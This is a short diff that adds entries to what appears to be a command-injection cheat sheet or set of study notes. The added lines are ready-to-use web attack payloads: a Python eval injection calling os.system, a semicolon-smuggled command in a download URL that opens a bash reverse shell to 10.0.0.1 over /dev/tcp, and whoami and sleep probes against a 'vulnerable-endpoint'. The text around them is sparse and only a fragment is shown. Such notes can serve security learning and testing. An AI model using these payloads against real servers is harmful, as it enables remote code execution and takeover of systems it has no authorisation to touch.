@@ -280,8 +280,15 @@
 		}
   	We establish a connection using ntcat then inject command in the json to get this connection
      --------------------------------------------------------------------------------------------------
-     2- 
-
+     2- GET /calculator?calc="__import__('os').system('ls')"
+     --------------------------------------------------------------------------------------------------
+     3- use ; 
+     		GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+     --------------------------------------------------------------------------------------------------
+     4- GET /vulnerable-endpoint?cmd=whoami
+	GET /vulnerable-endpoint?cmd=sleep+5
+  
+		
      
 </details>
 
